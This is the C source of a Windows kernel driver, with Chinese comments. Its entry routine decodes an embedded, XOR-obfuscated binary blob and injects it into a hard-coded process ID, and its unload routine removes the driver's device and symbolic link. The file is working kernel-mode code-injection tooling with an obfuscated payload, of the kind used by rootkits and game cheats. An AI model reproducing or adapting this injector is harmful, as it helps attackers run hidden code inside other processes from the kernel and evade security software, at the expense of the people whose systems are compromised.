#include<ntifs.h>
#include"dll.h"
#include"Inject.h"

#define 驱动设备名称	L"\\DEVICE\\Inject"
#define 驱动符号名称	L"\\??\\Inject"
void DeleteDevice(PDRIVER_OBJECT pDriver)
{
	DbgPrint("xcn:Enter DeleteDevice\n");
	if (pDriver->DeviceObject) //驱动设备指针
	{

		//删除符号链接

		UNICODE_STRING uzSymbolName; //符号链接名字		 
		RtlInitUnicodeString(&uzSymbolName, 驱动符号名称); //CreateFile
		DbgPrint("xcn:Remove symbolic links=%wZ\n", &uzSymbolName);
		IoDeleteSymbolicLink(&uzSymbolName);
		//
		DbgPrint("xcn:Deleting  Driver\n");
		IoDeleteDevice(pDriver->DeviceObject);//删除设备对象

	}
	DbgPrint("xcn:exit DeleteDevice\n");
}
void DriverUnload(PDRIVER_OBJECT pDriver)
{
	DeleteDevice(pDriver);
}

//驱动入口
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	pRegistryPath;
	pDriverObject->DriverUnload = DriverUnload;
	SIZE_T dwImageSize = sizeof(sysData);

	unsigned char* pMemory = (unsigned char*)ExAllocatePool(PagedPool, dwImageSize);
	RtlCopyMemory(pMemory, sysData, dwImageSize);
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}

	Inject(5956, pMemory, dwImageSize);
	ExFreePool(pMemory);


	return STATUS_SUCCESS;
}
